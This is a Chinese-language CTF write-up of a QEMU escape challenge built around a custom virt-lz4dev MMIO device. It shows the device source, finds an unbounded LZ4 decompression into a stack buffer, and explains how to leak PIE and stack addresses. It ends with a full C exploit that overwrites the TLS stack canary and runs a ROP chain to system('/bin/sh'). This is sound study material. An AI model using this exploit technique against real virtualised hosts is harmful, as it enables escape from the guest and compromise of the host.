> 感谢XDLiu师傅的帮助

感觉以后还是专门钻一个方向，不然时间花的太零散了。比如这次心血来潮看WSL去，最后发现完全是知识盲区，但至少学会了WSL怎么用了:）

rootfs.cpio.zst和rootfs.cpio
===========================

要向一个 `rootfs.cpio.zst` 文件中加入一个文件，并重新压缩为 `rootfs.cpio.zst`，需要进行以下步骤：

1. **解压缩 `rootfs.cpio.zst`**：首先，解压缩 `.zst` 文件，然后解开 `cpio` 文件以便访问其内容。
2. **添加文件**：将新的文件添加到解压后的文件系统中。
3. **重新打包为 `cpio` 文件**：将修改后的文件系统重新打包为 `cpio` 文件。
4. **压缩为 `.zst` 文件**：将新的 `cpio` 文件压缩为 `.zst`。

以下是在 Linux 系统上的具体操作步骤：

### 1. 解压缩 `rootfs.cpio.zst`

首先，确保你安装了 `zstd` 和 `cpio` 工具。如果还没有安装，可以使用包管理器安装，例如在 Ubuntu 上：

```bash
sudo apt update
sudo apt install zstd cpio
```

解压缩 `.zst` 文件：

```bash
unzstd rootfs.cpio.zst
```

此命令将生成一个 `rootfs.cpio` 文件。

### 2. 解开 `cpio` 文件

创建一个目录来存放解压后的文件系统：

```bash
mkdir rootfs
cd rootfs
```

解开 `cpio` 文件：

```bash
cpio -idmv < ../rootfs.cpio
```

### 3. 添加文件

将你想添加的文件复制到 `rootfs` 目录中。例如，如果你有一个名为 `newfile.txt` 的文件：

```bash
cp /path/to/newfile.txt .
```

### 4. 重新打包为 `cpio` 文件

从 `rootfs` 目录中创建一个新的 `cpio` 文件：

```bash
find . | cpio -o -H newc > ../new_rootfs.cpio
```

### 5. 压缩为 `.zst` 文件

将新的 `cpio` 文件压缩回 `.zst` 格式：

```bash
zstd -o rootfs.cpio.zst ../new_rootfs.cpio
```

### 清理临时文件

你可以删除临时文件和目录来清理空间：

```bash
rm ../new_rootfs.cpio
cd ..
rm -rf rootfs
```

sudo解决
======

XDLiu师傅解决的，tql！！！

> busybox原本权限是rws，s代表的是执行该文件时，它会以文件所有者的权限运行，而不是当前用户的权限。因为我们用普通用户解压了，其文件所有者的权限变成普通用户了，所以即便时root去执行该文件，还是以普通用户执行，这也是sudo解压压缩是可以正常用的原因，一直保持的是root为文件所有者

Lz4
===

[https://blog.csdn.net/weixin\_45412350/article/details/123336868](https://blog.csdn.net/weixin_45412350/article/details/123336868)

直接从给出的源码链接查看解压过程

```c
LZ4 is a more efficient compression algorithm, it's one of the many derivates of LZ77, and it is known for it speed in decompression, that makes it a first choice for realtime compression of filesystems, it is used by ZFS for example. (https://en.wikipedia.org/wiki/LZ4_(compression_algorithm))

In term of compression efficiency, it is a bit less efficient than zlib deflate algorithm, but in maximum compression mode (-hc mode) it's not far from zlib compression ratio.

Here is a decompression stub in x86_64 assembly, it's only 60 bytes, and can be called from a C program too:
       .globl lz4dec
       .intel_syntax noprefix
// lz4dec(const void *dst, void *src, void *srcend);
// rdi = dst, destination buffer
// rsi = src, compressed data
// rdx points to end of compressed data
lz4dec:
.l0:    xor ecx,ecx
        xor eax,eax
        lodsb
        movzx   ebx,al
.cpy:   shr al,4
        call buildfullcount
        rep movsb   rsi 指向的源地址开始，连续复制字节到 rdi 指向的目标地址，直到复制的字节数达到 rcx 指定的数量。
        cmp rsi,rdx
        jae exit
.copymatches:
        lodsw  rsi 寄存器指向的内存位置读取一个字（2 个字节），然后将其加载到 AX 寄存器中
        xchg ebx,eax
        and al,15
        call buildfullcount
.matchcopy:
        push rsi
        push rdi
        pop rsi
        sub rsi,rbx
        add ecx,4
        rep movsb
        pop rsi
        jmp .l0
buildfullcount:
        cmp al,15
        xchg ecx,eax
        jne exit   # <15
.buildloop:
        lodsb
        add ecx,eax
        cmp al,255
        je .buildloop
exit:   ret

#include <stdint.h>
#include <stddef.h>

void lz4dec(uint8_t* dst, const uint8_t* src, const uint8_t* srcend) {
    while (src < srcend)
    {
        uint32_t length = 0;
        uint32_t offset = 0;
        uint8_t token = *src++;

        // Copy literals
        length = token >> 4;  //len 
        if (length == 15) {
            uint8_t len;
            do {
                len = *src++;
                length += len;
            } while (len == 255 && src < srcend);
        }

        for (uint32_t i = 0; i < length; ++i) {  //literal
            *dst++ = *src++;
            if (src >= srcend) return;
        }

        if (src >= srcend) break;   

        // Copy matches
        offset = *(uint16_t*)src;   //offset
        src += 2;
        length = token & 0x0F;  //match length
        if (length == 15) {
            uint8_t len;
            do {
                len = *src++;
                length += len;
            } while (len == 255 && src < srcend);
        }
        length += 4;

        const uint8_t* match = dst - offset;
        for (uint32_t i = 0; i < length; ++i) {
            *dst++ = *match++;
        }
    }
}
```

可以利用`const uint8_t* match = dst - offset; for (uint32_t i = 0; i < length; ++i) { *dst++ = *match++; }`来往dst里面写越界，同时可以通过改offset来使得往低地址越界读

逆向
==

```c
/*
 * Virtual LZ4 Device
 *
 * Copyright (c) 2017 Milo Kim <woogyom.kim@gmail.com>
 *
 * This program is free software; you can redistribute it and/or
 * modify it under the terms of the GNU General Public License
 * as published by the Free Software Foundation; either version 2
 * of the License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, see <http://www.gnu.org/licenses/>.
 *
 */

#include "qemu/osdep.h"
#include "hw/irq.h"
#include "hw/qdev-properties.h"
#include "hw/sysbus.h"
#include "hw/virtio/virtio.h"
#include "migration/qemu-file-types.h"
#include "qemu/host-utils.h"
#include "qemu/module.h"
#include "sysemu/kvm.h"
#include "sysemu/replay.h"
#include "hw/virtio/virtio-mmio.h"
#include "qemu/error-report.h"
#include "qemu/log.h"
#include "trace.h"
#include "hw/hw.h"
#include "exec/memory.h"
#include "exec/address-spaces.h"
#include "qemu/bitops.h"

#define TYPE_VIRT_LZ4DEV          "virt-lz4dev"
#define VIRT_lz4dev(obj)          OBJECT_CHECK(Virtlz4devState, (obj), TYPE_VIRT_LZ4DEV)

/* Register map */
#define LZ4DEV_OFFSET_ID 0x00
#define LZ4DEV_OFFSET_LEN 0x08
#define LZ4DEV_OFFSET_TRIGGER 0x10
#define LZ4DEV_INBUF 0x20

#define REG_ID                 0x0
#define CHIP_ID                0xf001

#define INT_ENABLED            BIT(0)
#define INT_BUFFER_DEQ         BIT(1)

typedef struct {
    SysBusDevice parent_obj;
    MemoryRegion iomem;
    qemu_irq irq;
    hwaddr dst;
    hwaddr len;
    char inbuf[4096];

} Virtlz4devState;

extern uint64_t lz4dec_x86_64(void *dst, void *src, void *srcend);
uint64_t lz4_cmd_decompress(Virtlz4devState *s, char *dst);

uint64_t lz4_cmd_decompress(Virtlz4devState *s, char *dst)
{
uint64_t res;

    res = lz4dec_x86_64(dst, s->inbuf, s->inbuf+s->len);
    memcpy(&s->inbuf[0], dst, (res > 4096) ? 4096 : res);
    return res;
}

static uint64_t virt_lz4dev_read(void *opaque, hwaddr offset, unsigned size)
{
    Virtlz4devState *s = (Virtlz4devState *)opaque;
    uint64_t data;

        if ((offset>=0x20) && (((offset-0x20)+size)<4096))
        {
                data = 0;
                memcpy(&data, &s->inbuf[offset-0x20], size);
                return data;
        }

    switch (offset) {
    case LZ4DEV_OFFSET_ID:
        return 0xdeadbeef;
    case LZ4DEV_OFFSET_LEN:
        return s->len;
    default:
        break;
    }
    return 0;
}

static void virt_lz4dev_write(void *opaque, hwaddr offset, uint64_t value,
                          unsigned size)
{
    Virtlz4devState *s = (Virtlz4devState *)opaque;
    uint64_t data;
    char outbuf[4096];

    if ((offset>=0x20) && (((offset-0x20)+size)<0x800))
    {
        data = value;
        memcpy(&s->inbuf[offset-0x20], &data, size);
        return;
    }

    switch (offset) {
    case LZ4DEV_OFFSET_LEN:
        if ((hwaddr)value < 2048)
            s->len = (hwaddr)value;
        break;
    case LZ4DEV_OFFSET_TRIGGER:
        // return decompressed size in s->len
        s->len = (hwaddr)lz4_cmd_decompress(s, outbuf);
        break;
    default:
        break;
    }
}

static const MemoryRegionOps virt_lz4dev_ops = {
    .read = virt_lz4dev_read,
    .write = virt_lz4dev_write,
    .endianness = DEVICE_NATIVE_ENDIAN,
};

static void virt_lz4dev_realize(DeviceState *d, Error **errp)
{
    Virtlz4devState *s = VIRT_lz4dev(d);
    SysBusDevice *sbd = SYS_BUS_DEVICE(d);

    memory_region_init_io(&s->iomem, OBJECT(s), &virt_lz4dev_ops, s, TYPE_VIRT_LZ4DEV, 0x1000);
    sysbus_init_mmio(sbd, &s->iomem);
    sysbus_init_irq(sbd, &s->irq);
}

static void virt_lz4dev_class_init(ObjectClass *klass, void *data)
{
    DeviceClass *dc = DEVICE_CLASS(klass);

    dc->realize = virt_lz4dev_realize;
}

static const TypeInfo virt_lz4dev_info = {
    .name          = TYPE_VIRT_LZ4DEV,
    .parent        = TYPE_SYS_BUS_DEVICE,
    .instance_size = sizeof(Virtlz4devState),
    .class_init    = virt_lz4dev_class_init,
};

static void virt_lz4dev_register_types(void)
{
    type_register_static(&virt_lz4dev_info);
}

type_init(virt_lz4dev_register_types)

```

```c
diff --color -aur qemu-8.2.0/hw/arm/virt.c qemu-8.2.0-patched/hw/arm/virt.c
--- qemu-8.2.0/hw/arm/virt.c    2023-12-19 22:24:34.000000000 +0100
+++ qemu-8.2.0-patched/hw/arm/virt.c    2024-05-25 09:51:45.943761308 +0200
@@ -157,6 +157,7 @@
     [VIRT_PVTIME] =             { 0x090a0000, 0x00010000 },
     [VIRT_SECURE_GPIO] =        { 0x090b0000, 0x00001000 },
     [VIRT_MMIO] =               { 0x0a000000, 0x00000200 },
+    [VIRT_LZ4DEV] =             { 0x0b000000, 0x00000200 },
     /* ...repeating for a total of NUM_VIRTIO_TRANSPORTS, each of that size */
     [VIRT_PLATFORM_BUS] =       { 0x0c000000, 0x02000000 },
     [VIRT_SECURE_MEM] =         { 0x0e000000, 0x01000000 },
@@ -202,6 +203,7 @@
     [VIRT_GIC_V2M] = 48, /* ...to 48 + NUM_GICV2M_SPIS - 1 */
     [VIRT_SMMU] = 74,    /* ...to 74 + NUM_SMMU_IRQS - 1 */
     [VIRT_PLATFORM_BUS] = 112, /* ...to 112 + PLATFORM_BUS_NUM_IRQS -1 */
+    [VIRT_LZ4DEV] = 112 + PLATFORM_BUS_NUM_IRQS,
 };

 static const char *valid_cpus[] = {
@@ -1116,6 +1118,38 @@
     }
 }

+static void create_virt_lz4dev_device(const VirtMachineState *vms)
+{
+    MachineState *ms = MACHINE(vms);
+    hwaddr base = vms->memmap[VIRT_LZ4DEV].base;
+    hwaddr size = vms->memmap[VIRT_LZ4DEV].size;
+    int irq = vms->irqmap[VIRT_LZ4DEV];
+    char *nodename;
+
+    /*
+     * virt-lz4dev@0b000000 {
+     *         compatible = "virt-lz4dev";
+     *         reg = <0x0b000000 0x200>;
+     *         interrupt-parent = <&gic>;
+     *         interrupts = <176>;
+     * }
+     */
+
+    sysbus_create_simple("virt-lz4dev", base, qdev_get_gpio_in(vms->gic, irq));
+
+    nodename = g_strdup_printf("/virt_lz4dev@%" PRIx64, base);
+    qemu_fdt_add_subnode(ms->fdt, nodename);
+    qemu_fdt_setprop_string(ms->fdt, nodename, "compatible", "virt-lz4dev");
+    qemu_fdt_setprop_sized_cells(ms->fdt, nodename, "reg", 2, base, 2, size);
+    qemu_fdt_setprop_cells(ms->fdt, nodename, "interrupt-parent",
+                           vms->gic_phandle);
+    qemu_fdt_setprop_cells(ms->fdt, nodename, "interrupts",
+                           GIC_FDT_IRQ_TYPE_SPI, irq,
+                           GIC_FDT_IRQ_FLAGS_LEVEL_HI);
+
+    g_free(nodename);
+}
+
 #define VIRT_FLASH_SECTOR_SIZE (256 * KiB)

 static PFlashCFI01 *virt_flash_create1(VirtMachineState *vms,
@@ -2308,6 +2342,7 @@
      * no backend is created the transport will just sit harmlessly idle.
      */
     create_virtio_devices(vms);
+    create_virt_lz4dev_device(vms);

     vms->fw_cfg = create_fw_cfg(vms, &address_space_memory);
     rom_set_fw(vms->fw_cfg);
Seulement dans qemu-8.2.0-patched/hw/misc: lz4dec_x86_64.s
diff --color -aur qemu-8.2.0/hw/misc/meson.build qemu-8.2.0-patched/hw/misc/meson.build
--- qemu-8.2.0/hw/misc/meson.build  2023-12-19 22:24:34.000000000 +0100
+++ qemu-8.2.0-patched/hw/misc/meson.build  2023-12-31 03:52:01.645221730 +0100
@@ -1,5 +1,7 @@
 system_ss.add(when: 'CONFIG_APPLESMC', if_true: files('applesmc.c'))
 system_ss.add(when: 'CONFIG_EDU', if_true: files('edu.c'))
+system_ss.add(files('virt_lz4dev.c'))
+system_ss.add(files('lz4dec_x86_64.s'))
 system_ss.add(when: 'CONFIG_FW_CFG_DMA', if_true: files('vmcoreinfo.c'))
 system_ss.add(when: 'CONFIG_ISA_DEBUG', if_true: files('debugexit.c'))
 system_ss.add(when: 'CONFIG_ISA_TESTDEV', if_true: files('pc-testdev.c'))
Seulement dans qemu-8.2.0-patched/hw/misc: virt_lz4dev.c
diff --color -aur qemu-8.2.0/include/hw/arm/virt.h qemu-8.2.0-patched/include/hw/arm/virt.h
--- qemu-8.2.0/include/hw/arm/virt.h    2023-12-19 22:24:34.000000000 +0100
+++ qemu-8.2.0-patched/include/hw/arm/virt.h    2023-12-31 05:00:08.097627518 +0100
@@ -76,6 +76,7 @@
     VIRT_ACPI_GED,
     VIRT_NVDIMM_ACPI,
     VIRT_PVTIME,
+    VIRT_LZ4DEV,
     VIRT_LOWMEMMAP_LAST,
 };

```

```c
    .globl lz4dec_x86_64
    .intel_syntax noprefix
//
// https://github.com/nobodyisnobody/tools/tree/main/Assembly.Decompression.Stubs#2--lz4-compression
// small lz4 decompression stub in x86_64 assembly (60 bytes)
// lz4dec_x86_64(void *dst, void *src, void *srcend);
lz4dec_x86_64:
    push rcx
    push rbx
    push rdi
.l0:
    xor ecx,ecx
    xor eax,eax
    lodsb         从源指针（rsi）指向的内存位置加载一个字节到 al 寄存器
    movzx      ebx,al  将 al 中的 8 位无符号值扩展为 32 位，并存储在 ebx 中
.cpy:
    shr al,4
    call buildfullcount
    rep movsb
    cmp rsi,rdx
    jae .done2
.copymatches:
    lodsw
    xchg ebx,eax
    and al,15
    call buildfullcount
.matchcopy:
    push rsi
    push rdi
    pop rsi
    sub rsi,rbx
    add ecx,4
    rep movsb
    pop rsi
    jmp .l0

buildfullcount:
    cmp al,15
    xchg ecx,eax
    jne .done1
.buildloop:
    lodsb
    add ecx,eax
    cmp al,255
    je .buildloop
.done1:
    ret
.done2:
    push rdi
    pop rax
    pop rdi
    sub rax,rdi
    pop rbx
    pop rcx
    ret

#include <stdint.h>

// lz4dec_x86_64(void *dst, void *src, void *srcend);
void lz4dec_x86_64(uint8_t* dst, const uint8_t* src, const uint8_t* srcend) {
    const uint8_t* original_dst = dst;

    while (src < srcend) {
        uint32_t length = 0;
        uint32_t offset = 0;
        uint8_t token = *src++;

        // Copy literals
        length = token >> 4;
        if (length == 15) {
            uint8_t len;
            do {
                len = *src++;
                length += len;
            } while (len == 255 && src < srcend);
        }
        for (uint32_t i = 0; i < length; ++i) {
            *dst++ = *src++;
            if (src >= srcend) goto done2;
        }

        if (src >= srcend) break;

        // Copy matches
        offset = *(uint16_t*)src;
        src += 2;
        length = (token & 0x0F);
        if (length == 15) {
            uint8_t len;
            do {
                len = *src++;
                length += len;
            } while (len == 255 && src < srcend);
        }
        length += 4;

        const uint8_t* match = dst - offset;
        for (uint32_t i = 0; i < length; ++i) {
            *dst++ = *match++;
        }
    }

done2: ;
    // Calculate the decompressed length
    size_t decompressed_length = dst - original_dst;
}

```

漏洞点
===

```c

// lz4dec_x86_64(void *dst, void *src, void *srcend);
void lz4dec_x86_64(uint8_t* dst, const uint8_t* src, const uint8_t* srcend) {
    const uint8_t* original_dst = dst;

    while (src < srcend) {
        uint32_t length = 0;
        uint32_t offset = 0;
        uint8_t token = *src++;

        // Copy literals
        length = token >> 4;
        if (length == 15) {
            uint8_t len;
            do {
                len = *src++;
                length += len;
            } while (len == 255 && src < srcend);
        }
        for (uint32_t i = 0; i < length; ++i) {
            *dst++ = *src++;
            if (src >= srcend) goto done2;
        }

        if (src >= srcend) break;

        // Copy matches
        offset = *(uint16_t*)src;
        src += 2;
        length = (token & 0x0F);
        if (length == 15) {
            uint8_t len;
            do {
                len = *src++;
                length += len;
            } while (len == 255 && src < srcend);
        }
        length += 4;

        const uint8_t* match = dst - offset;
        for (uint32_t i = 0; i < length; ++i) {
            *dst++ = *match++;
        }
    }

done2: ;
    // Calculate the decompressed length
    size_t decompressed_length = dst - original_dst;
}

uint64_t lz4_cmd_decompress(Virtlz4devState *s, char *dst)
{
uint64_t res;

    res = lz4dec_x86_64(dst, s->inbuf, s->inbuf+s->len);
    memcpy(&s->inbuf[0], dst, (res > 4096) ? 4096 : res);
    return res;
}

static void virt_lz4dev_write(void *opaque, hwaddr offset, uint64_t value,
                          unsigned size)
{
    Virtlz4devState *s = (Virtlz4devState *)opaque;
    uint64_t data;
    char outbuf[4096];

 case LZ4DEV_OFFSET_TRIGGER:
        // return decompressed size in s->len
        s->len = (hwaddr)lz4_cmd_decompress(s, outbuf);
        break;     
 }
```

outbuf是栈上的，lz4\_cmd\_decompress会将s-&gt;inbuf, s-&gt;inbuf+s-&gt;len解压到outbuf里面，而这里没有4096的限制，会导致virt\_lz4dev\_write的栈溢出

交互
==

root权限可以打开/dev/mem，然后mmap映射物理地址到用户空间即可，我是傻逼，还想着模块，内核头文件都没给，显然不可能是模块.jpg

有个溢出废洞，放弃后感觉洞在解压缩上，咋pwn还涉及到找解压缩的算法。见世面了，显然是我太菜了.jpg

给了原来的源码，额。。。对比发现有改动。。。然后主要的洞就是传入的是压缩的数据，但这个压缩的数据是自己构造的。而不是通过其压缩方法来压缩的

思路
==

通过offset使得负越界泄露，但最大也是0xffff，发现没有canary可以泄露。发现所有残存的都在高地址

```bash
1a:00d0│         0x7f8eb4ffe0b0 —▸ 0x7f8eb4ffe0e0 ◂— 0
1b:00d8│         0x7f8eb4ffe0b8 —▸ 0x7f8eb4ffe1fe ◂— 0
1c:00e0│         0x7f8eb4ffe0c0 —▸ 0x7f8eb4ffe0e0 ◂— 0
1d:00e8│         0x7f8eb4ffe0c8 —▸ 0x5e4569b7c3c0 —▸ 0x5e45691ecd50 —▸ 0x5e4568fdef80 —▸ 0x5e4568fdf100 ◂— ...
1e:00f0│         0x7f8eb4ffe0d0 ◂— 4
1f:00f8│ rsp     0x7f8eb4ffe0d8 —▸ 0x5e4566b27879 (lz4_cmd_decompress+73) ◂— mov ecx, 0x1000
20:0100│ rdi r12 0x7f8eb4ffe0e0 ◂— 0    // 是dst  -offset可以泄露上面内容

```

所以只能通过覆盖TLS中的canary来修改

然后打rop

TLScanary：
==========

<https://www.cnblogs.com/CH13hh/p/18299195>

每个线程有一个TCB和自己的TLS（Thread-Local Storage）区域（存储独立的canary）

每个TCB指向TLS区域，TCB保存在高地址

- 溢出大字节至少1page
- 能创建线程，线程里栈溢出

```c
struct pthread {
#if !TLS_DTV_AT_TP
    /* This overlaps the TCB as used for TLS without threads (see tls.h).  */
    tcbhead_t header; // 可能与TLS相关的头部信息
#else
    struct {
        // 更复杂的结构体定义
        // 可能包含与TLS相关的更多详细信息
        // ...
    } header;
#endif
​
    /* Extra padding for alignment and potential future use */
    void *__padding[24]; // 填充数组，用于对齐和可能的未来扩展
};

typedef struct {
    void *tcb;            /* 指向线程控制块（TCB）的指针 */
    dtv_t *dtv;           /* 线程特定数据的指针 */
    void *self;           /* 指向线程描述符的指针 */
    int multiple_threads; /* 标识是否有多个线程 */
    int gscope_flag;      /* 全局作用域标志 */
    uintptr_t sysinfo;    /* 系统信息 */
    uintptr_t stack_guard;/* 堆栈保护 */
    uintptr_t pointer_guard; /* 指针保护 */
​
    /* 其他可能的字段... */
} tcbhead_t;
```

注意覆盖fs部分时canary前面部分尽量保持原样或者同类型的，不如就会出现如下问题

```bash
► 0x784be8ca38a0 <pthread_setcancelstate>       endbr64 
   0x784be8ca38a4 <pthread_setcancelstate+4>     cmp    edi, 1     1 - 1     EFLAGS => 0x246 [ cf PF af ZF sf IF df of ]
   0x784be8ca38a7 <pthread_setcancelstate+7>     ja     pthread_setcancelstate+80   <pthread_setcancelstate+80>

   0x784be8ca38a9 <pthread_setcancelstate+9>     mov    rax, qword ptr fs:[0x10]         RAX, [0x784bb54006d0] => 0x101010101010101
   0x784be8ca38b2 <pthread_setcancelstate+18>    lea    rcx, [rax + 0x308]               RCX => 0x101010101010409
   0x784be8ca38b9 <pthread_setcancelstate+25>    mov    eax, dword ptr [rax + 0x308]     <Cannot dereference [0x101010101010409]>

```

exp
===

```c
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>
#include <stdint.h>

#define VIRT_LZ4DEV_BASE 0x0b000000
#define VIRT_LZ4DEV_SIZE 0x00000200

#define LZ4DEV_OFFSET_ID 0x00
#define LZ4DEV_OFFSET_LEN 0x08
#define LZ4DEV_OFFSET_TRIGGER 0x10
#define LZ4DEV_INBUF 0x20

void compress(char low,char high,int literal_len,char*literal,short offset,int match_len)
{
}
int main() {
    int fd;
    void *map_base;
    volatile uint64_t *id_reg;
    volatile uint64_t *len_reg;
    volatile uint64_t *trigger_reg;
    volatile uint8_t *inbuf;
    uint64_t token;
    uint64_t literal_len;
    uint64_t literal;
    uint64_t offset;
    uint64_t match_len;
    uint64_t   compress;
    // Open /dev/mem
    fd = open("/dev/mem", O_RDWR | O_SYNC);
    if (fd == -1) {
        perror("open /dev/mem");
        exit(1);
    }

    // Map the device memory
    map_base = mmap(NULL, VIRT_LZ4DEV_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd, VIRT_LZ4DEV_BASE);
    if (map_base == MAP_FAILED) {
        perror("mmap");
        close(fd);
        exit(1);
    }

    // Get pointers to the registers
    id_reg = (volatile uint64_t *)(map_base + LZ4DEV_OFFSET_ID);
    len_reg = (volatile uint64_t *)(map_base + LZ4DEV_OFFSET_LEN);
    trigger_reg = (volatile uint64_t *)(map_base + LZ4DEV_OFFSET_TRIGGER);
    inbuf = (volatile uint8_t *)(map_base + LZ4DEV_INBUF);

    // leak 
    token=0xf;
    offset=0x20<<8;
    match_len=0x20<<24;

    compress=token|offset|match_len;
    // Write some data to the input buffer
    *(uint32_t*)inbuf=compress;
    *len_reg=8;
    // Trigger the decompression
    *trigger_reg = 1;

    uint64_t lowerpie =*(uint32_t*)(inbuf+24);  //0xc01f20  0x7cee0a000000
    printf("lower pie %llx \n",lowerpie);
    uint64_t higherpie =*(uint32_t*)(inbuf+28);
    printf("higher pie %llx \n",higherpie);
    uint64_t pie=lowerpie|(higherpie<<32);
    pie=pie-0x44a879;
    printf("pie %llx \n",pie);

    uint64_t system_addr=0x0000000000822D77+pie;
    uint64_t binsh_addr=0x0000000000A7D49E +pie;
    uint64_t pop_rdi_ret=0x0000000000335838+pie;
    uint64_t ret_addr=0x0000000000335839+pie;

    uint64_t lowerstack =*(uint32_t*)(inbuf);  //0xc01f20  0x7cee0a000000
    printf("lower stack %llx \n",lowerstack);
    uint64_t higherstack =*(uint32_t*)(inbuf+4);
    printf("higher stack %llx \n",higherstack);
    uint64_t stack=lowerstack|(higherstack<<32);

    printf("stack %llx \n",stack);

    *len_reg=0x100;
   //paddding  4096
    token=0x1f;
    literal=1<<8;
    offset=1<<16;

    compress=token|literal|offset;
    // Write some data to the input buffer
    *(uint32_t*)inbuf=compress;
      match_len=0xffffffffffffffff;
    *(uint64_t*)(inbuf+4)=match_len;
      match_len=0xfbffffffffffffff;
    *(uint64_t*)(inbuf+12)=match_len;

    //paddding 0x48
    token=0x1f;
    literal=1<<8;
    offset=1<<16;
    compress=token|literal|offset;
    *(uint32_t*)(inbuf+20)=compress;
    match_len=0x47-0xf-4-0x20;
    *(uint8_t*)(inbuf+24)=match_len;

    //rop chain
    token=0xf0;
    literal_len=(0x20-0xf)<<8;
    compress=token|literal_len;
    *(uint16_t*)(inbuf+25)=compress;

    printf("pop_rdi_ret %llx \n",pop_rdi_ret);
    printf("binsh_addr %llx \n",binsh_addr);
    printf("system_addr %llx \n",system_addr);
    printf("ret_addr %llx \n",ret_addr);

    *(uint64_t*)(inbuf+27)=pop_rdi_ret;
    *(uint64_t*)(inbuf+35)=binsh_addr;
    *(uint64_t*)(inbuf+43)=system_addr;
    *(uint64_t*)(inbuf+51)= ret_addr;

    offset=0;
    *(uint16_t*)(inbuf+59)=offset;

    // padding 
    token=0x1f;
    literal=1<<8;
    offset=1<<16;

    compress=token|literal|offset;
    // Write some data to the input buffer
    *(uint32_t*)(inbuf+61)=compress;
      match_len=0xffffffffffffffff;
    *(uint64_t*)(inbuf+65)=match_len;
      match_len=0xffffffffffffffff;
    *(uint64_t*)(inbuf+73)=match_len;
      match_len=0x95ffffffffff;
    *(uint64_t*)(inbuf+81)=match_len;

   // cover TLS
    token=0xf0;
    literal_len=(0x28-0xf)<<8;
    compress=token|literal_len;
    *(uint16_t*)(inbuf+87)=compress;

    *(uint64_t*)(inbuf+89)=stack;
    *(uint64_t*)(inbuf+97)=binsh_addr;
    *(uint64_t*)(inbuf+105)=stack;
    *(uint64_t*)(inbuf+113)= 1;
    *(uint64_t*)(inbuf+121)= 0;
    *(uint64_t*)(inbuf+129)= 0x101011001010101;
    offset=0;
    *(uint16_t*)(inbuf+137)=offset;

    // trigger
    int decompressed_len=*len_reg;
    *trigger_reg = 1;
    // Read the decompressed data from the input buffer
    for (uint64_t i = 0; i < decompressed_len; i++) {
        printf("%02x \n", inbuf[i]);
    }

    // Unmap the device memory
    munmap(map_base, VIRT_LZ4DEV_SIZE);

    // Close the file descriptor
    close(fd);

    return 0;
}
//0x10f4d0
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/10/attach-2f01d2174bfe25339c7f47dbcef6fcf7cd937741.png)